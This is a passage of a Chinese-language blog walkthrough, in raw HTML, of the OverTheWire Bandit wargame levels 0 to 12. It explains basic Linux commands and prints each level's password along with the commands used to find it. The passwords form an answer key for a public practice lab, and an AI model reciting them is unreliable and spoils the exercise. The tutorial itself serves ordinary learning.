class=\"line\">boJ9jbbUNNfktd78OOpsqOltutMc3MY1</div></pre></td></tr></table></figure>\n<p>心路历程：借上图中的红框，「~」表明我们登陆后的当前位置是该用户的主目录，<code>ls</code> 列出当前目录下的文件，发现确实有这个「readme」文件。使用 <code>cat</code> 命令打印出文件的内容。<br>拿到这个所谓的密码之后，我们要使用 exit 命令退出这次登陆（直接刷新网页更快～）。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit0@bandit:~$ <span class=\"built_in\">exit</span> </div><div class=\"line\"><span class=\"built_in\">logout</span></div><div class=\"line\">Connection to bandit.labs.overthewire.org closed.</div><div class=\"line\">NaCl 插件已退出，状态代码为：0。</div><div class=\"line\">重新连接(&amp;R)、选择其他连接(&amp;C)或退出(&amp;E)</div></pre></td></tr></table></figure>\n<p>这时我们输入 C，然后配置新的连接，使用新的用户名「bandit1」和密码「boJ9jbbUNNfktd78OOpsqOltutMc3MY1」登陆就ok了。<br>提示：如果大家不知道去哪里查找命令的话，可以在终端中 <code>man 命令</code>，例如 <code>man ls</code>。天生英文抗性为负的朋友可以来这里查👉<a href=\"http://man.linuxde.net/\" target=\"_blank\" rel=\"external\">Linux 命令大全</a>，但并不能完全取代 man 手册。</p>\n<hr>\n<p>Level 1 - 2</p>\n<p>描述：下一级别的密码存储在一个名为 - 位于主目录中的文件中。</p>\n<p>密码：CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit1@bandit:~$ ls</div><div class=\"line\">-</div><div class=\"line\">bandit1@bandit:~$ cat ./-</div><div class=\"line\">CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</div></pre></td></tr></table></figure>\n<p>心路历程：文件名是「-」，如果是其他名字直接 <code>cat filename</code> 就好了，然而如果是 <code>cat -</code> 的话，就有一些小问题，因为 bash 中会用「-」来接受命令行参数，未避免冲突，我们使用「./」来表示当前目录，那「-」文件就表示为「./-」。</p>\n<hr>\n<p>Level 2 - 3</p>\n<p>描述：下一级别的密码存储在位于主目录中的文件名含有「空格」的文件中</p>\n<p>密码：UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit2@bandit:~$ ls</div><div class=\"line\">spaces <span class=\"keyword\">in</span> this filename</div><div class=\"line\">bandit2@bandit:~$ ll</div><div class=\"line\">total 28</div><div class=\"line\">drwxr-xr-x  3 bandit2 bandit2 4096 Nov 10 15:23 ./</div><div class=\"line\">drwxr-xr-x 30 root    root    4096 Nov 10 15:23 ../</div><div class=\"line\">-rw-r--r--  1 bandit2 bandit2  220 Apr  9  2014 .bash_logout</div><div class=\"line\">-rw-r--r--  1 bandit2 bandit2 3637 Apr  9  2014 .bashrc</div><div class=\"line\">drwx------  2 bandit2 bandit2 4096 Nov 10 15:23 .cache/</div><div class=\"line\">-rw-r--r--  1 bandit2 bandit2  675 Apr  9  2014 .profile</div><div class=\"line\">-rw-r-----  1 bandit3 bandit2   33 Sep 28 14:04 spaces <span class=\"keyword\">in</span> this filename</div><div class=\"line\">bandit2@bandit:~$ cat spaces\\ <span class=\"keyword\">in</span>\\ this\\ filename </div><div class=\"line\">UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</div></pre></td></tr></table></figure>\n<p>心路历程：这关使用 <code>ls</code> 后没办法确定文件的数量（1～4个），使用 <code>ll</code> 命令（<code>ls -alF</code>）查看一下发现是一个单独的文件（「.」开头的文件为隐藏文件，故之前没有显示）。这里的空格面临的情况跟之前的「-」差不多，避免混淆，使用「\\ 」（斜线后跟空格表示空格）。<br>提示：<code>ll</code> 并不是 linux 的基本命令，而是「.bashrc」这个文件中的<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">alias</span> ll=<span class=\"string\">'ls -alF'</span></div></pre></td></tr></table></figure></p>\n<p>这句话定义的。相当于对 <code>ls -alF</code> 这个命令起了一个别名。<br>因为这个别名的定义较为普遍，所以我没看这个文件内容之前就习惯性的试了下。</p>\n<hr>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit3@bandit:~$ ls</div><div class=\"line\">inhere</div><div class=\"line\">bandit3@bandit:~$ <span class=\"built_in\">cd</span> inhere </div><div class=\"line\">bandit3@bandit:~/inhere$ ls</div><div class=\"line\">bandit3@bandit:~/inhere$ ll</div><div class=\"line\">total 12</div><div class=\"line\">drwxr-xr-x 2 root    root    4096 Sep 28 14:04 ./</div><div class=\"line\">drwxr-xr-x 4 bandit3 bandit3 4096 Nov 10 15:42 ../</div><div class=\"line\">-rw-r----- 1 bandit4 bandit3   33 Sep 28 14:04 .hidden</div><div class=\"line\">bandit3@bandit:~/inhere$ cat .hidden </div><div class=\"line\">pIwrPrtPN36QITSp3EQaw936yaFoFgAB</div></pre></td></tr></table></figure>\n<p>心路历程：进入「inhere」目录后使用 <code>ls</code> 命令看不到非隐藏文件，我们使用 <code>ll</code> 就ok了。</p>\n<hr>\n<p>Level 4 -5</p>\n<p>描述：下一级别的密码存储在inhere目录中唯一的人类可读文件中。提示：如果你的终端搞砸了，试试“重置”命令。</p>\n<p>密码：koReBOKuIDDepwhWk7jZC0RTdopnAYKh</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit4@bandit:~$ ls</div><div class=\"line\">inhere</div><div class=\"line\">bandit4@bandit:~$ <span class=\"built_in\">cd</span> inhere</div><div class=\"line\">bandit4@bandit:~/inhere$ ls</div><div class=\"line\">-file00  -file01  -file02  -file03  -file04  -file05  -file06  -file07  -file08  -file09</div><div class=\"line\">bandit4@bandit:~/inhere$ file ./*</div><div class=\"line\">./-file00: Non-ISO extended-ASCII text, with CR line terminators, with escape sequences</div><div class=\"line\">./-file01: data</div><div class=\"line\">./-file02: data</div><div class=\"line\">./-file03: data</div><div class=\"line\">./-file04: data</div><div class=\"line\">./-file05: data</div><div class=\"line\">./-file06: data</div><div class=\"line\">./-file07: ASCII text</div><div class=\"line\">./-file08: data</div><div class=\"line\">./-file09: data</div><div class=\"line\">bandit4@bandit:~/inhere$ cat ./-file07</div><div class=\"line\">koReBOKuIDDepwhWk7jZC0RTdopnAYKh</div></pre></td></tr></table></figure>\n<p>心路历程：因为描述中提到了这个文件是唯一人类可读的文件，大概率会与其他文件不太一样，我们选择使用 <code>file</code> 命令查看文件类型后发现只有一个 「ASCII text」文件，那基本就是它了。</p>\n<hr>\n<p>Level 5 - 6</p>\n<p>描述：下一级别的密码存储在inhere目录下的某个文件中，并具有以下所有属性： 人类可读，大小为1033字节，不可执行。</p>\n<p>密码：DXjZPULLxYr17uwoI01bNLQbtFemEgo7</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit5@bandit:~$ ls</div><div class=\"line\">inhere</div><div class=\"line\">bandit5@bandit:~$ <span class=\"built_in\">cd</span> inhere; ll</div><div class=\"line\">total 88</div><div class=\"line\">drwxr-x--- 22 root    bandit5 4096 Sep 28 14:04 ./</div><div class=\"line\">drwxr-xr-x  4 bandit5 bandit5 4096 Nov 11 06:01 ../</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere00/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere01/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere02/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere03/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere04/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere05/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere06/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere07/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere08/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere09/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere10/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere11/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere12/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere13/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere14/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere15/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere16/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere17/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere18/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere19/</div><div class=\"line\">bandit5@bandit:~/inhere$ find . -type f -size 1033c</div><div class=\"line\">./maybehere07/.file2</div><div class=\"line\">bandit5@bandit:~/inhere$ cat ./maybehere07/.file2</div><div class=\"line\">DXjZPULLxYr17uwoI01bNLQbtFemEgo7</div></pre></td></tr></table></figure>\n<p>心路历程：第二个命令 <code>cd inhere; ll</code> 两个命令通过分号间隔，会分别执行。我们发现 inhere 目录下还有好多目录（文件夹）。这如果一个一个找就累死了。我们使用 <code>find</code> 命令查找一下。<code>-type f</code>指定文件类型为普通文件，<code>-size 1033c</code> 指定文件大小为 1033 bytes。具体可参考我上面给出的 <a href=\"http://man.linuxde.net/\" target=\"_blank\" rel=\"external\">Linux 命令大全</a><br>提示：<code>ls -l</code> 后每行开头的字符串中第一个字母是「d」表示为「directory」- 目录。我们使用的 <code>ll</code> 在 .bashrc 文件中被定义为 <code>ls -alF</code> 其中 <code>a</code> 是显示隐藏文件， <code>l</code> 是详细信息， <code>F</code> 是每条后面追加文件类型标识符，我们输出的每行内容尾部都有的「／」就表示这些都是目录。</p>\n<hr>\n<p>Level 6 - 7</p>\n<p>描述：下一级别的密码存储在服务器的某个位置，具有以下所有属性： 所属用户bandit7，所属用户组bandit6，拥有 33个字节的大小</p>\n<p>密码：HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit6@bandit:~$ find / -group bandit6 -user bandit7 -size 33c 2&gt;/dev/null</div><div class=\"line\">/var/lib/dpkg/info/bandit7.password</div><div class=\"line\">bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password</div><div class=\"line\">HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</div></pre></td></tr></table></figure>\n<p>心路历程：描述中说「存储在服务器的某个位置」，我们使用「／」这个 linux 根目录作为我们搜索的最顶层。其中我们还用到了 Linux 下的「黑洞」，把错误输入全扔了进去。这样就只返回了正确结果。<br>如果把错误输出重定向到「黑洞」中，就是酱紫滴：<br><img src=\"/Image/bandit_resources/6672B54C1537E1423C2D857DA346FF5B.jpg\" alt=\"IMAGE\"><br>太多干扰信息不好观察。<br>提示：「2&gt;/dev/null」中「2」表示错误输出，「&gt;」是重定向符号表示把信息送到哪里，「/dev/null」是「Linux黑洞」。这里有篇文章供参考👉<a href=\"http://www.kissyu.org/2016/12/25/shell%E4%B8%AD%3E%20:dev:null%202%20%3E%20&amp;1%E6%98%AF%E4%BB%80%E4%B9%88%E9%AC%BC%EF%BC%9F/\" target=\"_blank\" rel=\"external\">shell中&gt;/dev/null 2&gt;&amp;1是什么鬼？</a></p>\n<hr>\n<p>Level 7 - 8</p>\n<p>描述：下一级的密码存储文件data.txt中 “millionth” 的下一个单词。</p>\n<p>密码： cvX2JJa4CFALtqS87jk27qwqGhBM9plV</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit7@bandit:~$ ll</div><div class=\"line\">total 4112</div><div class=\"line\">drwxr-xr-x  3 bandit7 bandit7    4096 Nov 11 07:48 ./</div><div class=\"line\">drwxr-xr-x 30 root    root       4096 Nov 11 07:48 ../</div><div class=\"line\">-rw-r--r--  1 bandit7 bandit7     220 Apr  9  2014 .bash_logout</div><div class=\"line\">-rw-r--r--  1 bandit7 bandit7    3637 Apr  9  2014 .bashrc</div><div class=\"line\">drwx------  2 bandit7 bandit7    4096 Nov 11 07:48 .cache/</div><div class=\"line\">-rw-r--r--  1 bandit7 bandit7     675 Apr  9  2014 .profile</div><div class=\"line\">-rw-r-----  1 bandit8 bandit7 4184396 Sep 28 14:04 data.txt</div><div class=\"line\">bandit7@bandit:~$ grep millionth data.txt</div><div class=\"line\">millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV</div></pre></td></tr></table></figure>\n<p>心路历程：我们查看文件详细内容时发现这个文件比较大，光靠肉眼找是没戏了。所以我们借助命令 <code>grep</code> 找到 「milionth」这个单词所在行的内容，后面跟着下一关的密码。（其实最开始我惯性的<code>ls</code> 然后 <code>cat</code> 了一下……发觉不太对赶紧 <code>ctrl+c</code> 终止， <code>ll</code> 看了眼大小……）</p>\n<hr>\n<p>Level 8 - 9</p>\n<p>描述：下一个级别的密码存储在文件data.txt中，并且是仅出现一次的文本行。</p>\n<p>密码：UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit8@bandit:~$ ls</div><div class=\"line\">data.txt</div><div class=\"line\">bandit8@bandit:~$ sort data.txt | uniq -u</div><div class=\"line\">UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</div></pre></td></tr></table></figure>\n<p>心路历程：又描述得知这是一个文本文件，里面有很多行字符串，我们需要找到其中仅出现一次的行。使用 <code>sort</code> 命令对文件排序后再对其结果进行 <code>uniq -u</code> 只显示其中的单一行。<br>提示：uniq -u 是上下相邻两行对比得到是否为单一行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit8@bandit:~$ <span class=\"built_in\">echo</span> -en <span class=\"string\">\"1\\n1\\n2\\n1\\n\"</span> &gt;test.txt</div><div class=\"line\">bandit8@bandit:~$ cat test.txt </div><div class=\"line\">1</div><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">1</div><div class=\"line\">bandit8@bandit:~$ uniq -u test.txt </div><div class=\"line\">2</div><div class=\"line\">1</div></pre></td></tr></table></figure></p>\n<p>如例子中的前两行被认定为重复行，第二行与第三行不同，第三行与第四行不同，所以「2」被当作了唯一行。第四行中的「1」同理。<br>所以我们这里要先对文件排序：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit8@bandit:~$ sort test.txt &gt; sorted.txt; cat sorted.txt</div><div class=\"line\">1</div><div class=\"line\">1</div><div class=\"line\">1</div><div class=\"line\">2</div></pre></td></tr></table></figure></p>\n<p>然后再筛选唯一行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit8@bandit:~$ uniq -u sorted.txt</div><div class=\"line\">2</div></pre></td></tr></table></figure></p>\n<hr>\n<p>Level 9 - 10</p>\n<p>描述：下一个级别的密码存储在文件data.txt中的几个人类可读字符串之一，从几个“=”字符开始。</p>\n<p>密码：truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit9@bandit:~$ ls</div><div class=\"line\">data.txt</div><div class=\"line\">bandit9@bandit:~$ strings data.txt | grep ==</div><div class=\"line\">|========== the</div><div class=\"line\">========== password</div><div class=\"line\">========== is</div><div class=\"line\">========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</div></pre></td></tr></table></figure>\n<p>心路历程：描述中提到了几个人类可读字符，那我们用 strings 筛选一下（strings是在文件中查找可打印字符串并输出长度为4个或更多的字符串，遇到换行或空字符结束）。其中也提到从几个「=」符号开始，那我们用 grep 命令筛选 含有「==」的字符串看看。</p>\n<hr>\n<p>Level 10 - 11</p>\n<p>描述：下一级别的密码存储在data.txt文件中，该文件包含base64编码数据</p>\n<p>密码：IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit10@bandit:~$ ls</div><div class=\"line\">data.txt</div><div class=\"line\">bandit10@bandit:~$ cat data.txt</div><div class=\"line\">VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==</div><div class=\"line\">bandit10@bandit:~$ base64 <span class=\"_\">-d</span> data.txt </div><div class=\"line\">The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</div></pre></td></tr></table></figure>\n<p>心路历程：题目告诉我们使用 base64 编码了数据，那我们解码就好了。</p>\n<hr>\n<p>Level 11 - 12</p>\n<p>描述：下一级的密码存储在文件data.txt中，其中所有小写（a-z）和大写（A-Z）字母已经被旋转了13个位置</p>\n<p>密码：5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit11@bandit:~$ ls</div><div class=\"line\">data.txt</div><div class=\"line\">bandit11@bandit:~$ cat data.txt</div><div class=\"line\">Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh</div><div class=\"line\">bandit11@bandit:~$ cat data.txt | tr <span class=\"string\">'a-zA-Z'</span> <span class=\"string\">'n-za-mN-ZA-M'</span></div><div class=\"line\">The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</div></pre></td></tr></table></figure>\n<p>心路历程：这里我们用到了 <code>tr</code> 命令，参数为两个字符集，把第一个字符集中的字符替换为第二个字符集中的对应字符。题目中说旋转了13个位置，相当于26个字母前十三个和后十三个换了个位置。按照这样的对应关系，调整给出的字符集。<br>提示：有人会写程序来做替换，但是对于这道题来讲 tr 会方便很多。虽然这个命令不常用，用起来还是很爽的。</p>\n<hr>\n<p>Level 12 - 13</p>\n<p>描述：下一级的密码存储在data.txt文件中，该文件是一个已被重复压缩的文件的十六进制转储文件。对于这个级别，可以在 <code>/tmp</code> 下使用 <code>mkdir</code> 创建一个工作的目录。例如：<code>mkdir /tmp/myname123</code> 。然后使用 <code>cp</code> 复制数据文件，并使用 <code>mv</code> 重命名（阅读manpages！）<br>密码：8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit12@bandit:~$ ls</div><div class=\"line\">data.txt</div><div class=\"line\">bandit12@bandit:~$ mkdir /tmp/GeekaLeo123 ; cp data.txt /tmp/GeekaLeo123/data_1 ; <span class=\"built_in\">cd</span> /tmp/GeekaLeo123</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ cat data_1 ; file data_1</div><div class=\"line\">0000000: 1f8b 0808 5601 <span class=\"built_in\">cd</span>59 0203 6461 7461 322e  ....V..Y..data2.</div><div class=\"line\">0000010: 6269 6e00 013f 02c0 fd42 5a68 3931 4159  bin..?...BZh91AY</div><div class=\"line\">0000020: 2653 5914 13ca ff00 001b ffff faef 7fff  &amp;SY.............</div><div class=\"line\">0000030: f9fb a79e de5b efbb ffff fd7f cf7b fbff  .....[.......&#123;..</div><div class=\"line\">0000040: ff7f afbd 8ddb ff77 f752 ffff b001 3b56  .......w.R....;V</div><div class=\"line\">0000050: 6100 01a3 d400 0000 0068 d0d0 69a0 0000  a........h..i...</div><div class=\"line\">0000060: 007a 867a 9034 0340 6401 a340 0000 f280  .z.z.4.@d..@....</div><div class=\"line\">0000070: 01ea 0d1a 1a1a 0d01 9034 0e40 0000 0686  .........4.@....</div><div class=\"line\">0000080: 8d00 00c8 6819 3406 8d1e a003 d400 0c80  ....h.4.........</div><div class=\"line\">0000090: f534 0034 309a 0006 83d4 0000 01a6 80c8  .4.40...........</div><div class=\"line\">00000a0: 1900 6103 a01b 5034 69a1 a1a0 6868 3403  ..a...P4i...hh4.</div><div class=\"line\">00000b0: 4341 a340 64f5 3400 0680 6801 a340 6800  CA.@d.4...h..@h.</div><div class=\"line\">00000c0: 000d 0068 0340 00d0 01a1 a068 3430 3516  ...h.@.....h405.</div><div class=\"line\">00000d0: 1543 1355 0d26 5d39 505d 970e fcac 9c37  .C.U.&amp;]9P].....7</div><div class=\"line\">00000e0: 0ec4 62b1 05bc 607b 68e4 c4f4 efa3 32f8  ..b...`&#123;h.....2.</div><div class=\"line\">00000f0: 6d9e 9c52 9d50 36a0 5598 b734 a0c4 7683  m..R.P6.U..4..v.</div><div class=\"line\">0000100: 04e3 7cbd ec15 ea5d 1db8 1283 ea8b 4318  ..|....]......C.</div><div class=\"line\">0000110: 0358 207a a12c 554f 4a2d 5428 eb47 6e7c  .X z.,UOJ-T(.Gn|</div><div class=\"line\">0000120: ffdc 4018 60<span class=\"built_in\">fc</span> 0690 28ec 12b9 5d02 eecb  ..@.`...(...]...</div><div class=\"line\">0000130: 11d4 e987 eb36 d574 e87c 2e67 f803 2cdf  .....6.t.|.g..,.</div><div class=\"line\">0000140: b465 9110 302d a9c0 0c33 3e55 573c 8818  .e..0-...3&gt;UW&lt;..</div><div class=\"line\">0000150: 76cf 6c6a 5efd c51e 20ec 2358 f5a8 694e  v.lj^... .<span class=\"comment\">#X..iN</span></div><div class=\"line\">0000160: bc7a bc91 0376 ebc8 61a2 33c1 97e9 936d  .z...v..a.3....m</div><div class=\"line\">0000170: df2b ceef 0a4f 6039 8cb5 b9cc d490 607b  .+...O`9......`&#123;</div><div class=\"line\">0000180: ff20 e253 1875 489a 0465 3643 497e 8348  . .S.uH..e6CI~.H</div><div class=\"line\">0000190: 51dd d85e 5038 9c31 fcc3 bb2b 6157 0413  Q..^P8.1...+aW..</div><div class=\"line\">00001a0: 7b90 6633 f706 0005 3dc0 7d9b f4ba b026  &#123;.f3....=.&#125;....&amp;</div><div class=\"line\">00001b0: 1a91 eca8 8423 7d1b 0401 d150 0c14 1<span class=\"built_in\">fc</span>5  .....<span class=\"comment\">#&#125;....P....</span></div><div class=\"line\">00001c0: ef57 ef39 3e53 dfc5 c2ce 29de 871f dce8  .W.9&gt;S....).....</div><div class=\"line\">00001d0: 2f85 3ff8 1f16 a894 6677 d26e a7b6 2550  /.?.....fw.n..%P</div><div class=\"line\">00001e0: bc05 d2e6 51f8 d799 52f1 2783 a642 db4e  ....Q...R.<span class=\"string\">'..B.N</span></div><div class=\"line\">00001f0: 344f b1a4 608c 4249 20f6 549e 64db e2e8  4O..`.BI .T.d...</div><div class=\"line\">0000200: 55da 10b5 adfc 28fd 1a8c 7e81 4188 5028  U.....(...~.A.P(</div><div class=\"line\">0000210: 29ec ddf4 4bef 8de6 9a0b 0d49 14e7 d30e  )...K......I....</div><div class=\"line\">0000220: 48a4 55b8 5729 7484 2900 e001 e451 7290  H.U.W)t.)....Qr.</div><div class=\"line\">0000230: 057c f004 bb85 0788 0139 d730 8a08 0448  .|.......9.0...H</div><div class=\"line\">0000240: 4a45 0565 243c 7017 9906 e644 ff8b b922  JE.e$&lt;p....D...\"</div><div class=\"line\">0000250: 9c28 480a 09e5 7f80 c978 5ff9 3f02 0000  .(H......x_.?...</div><div class=\"line\">data_1: ASCII text</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ xxd -r data_1 &gt; data_2 ; file data_2</div><div class=\"line\">data_2: gzip compressed data, was \"data2.bin\", from Unix, last modified: Thu Sep 28 14:04:06 2017, max compression</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ mv data_2 data_3.gz ; gzip -d data_3.gz ; ls</div><div 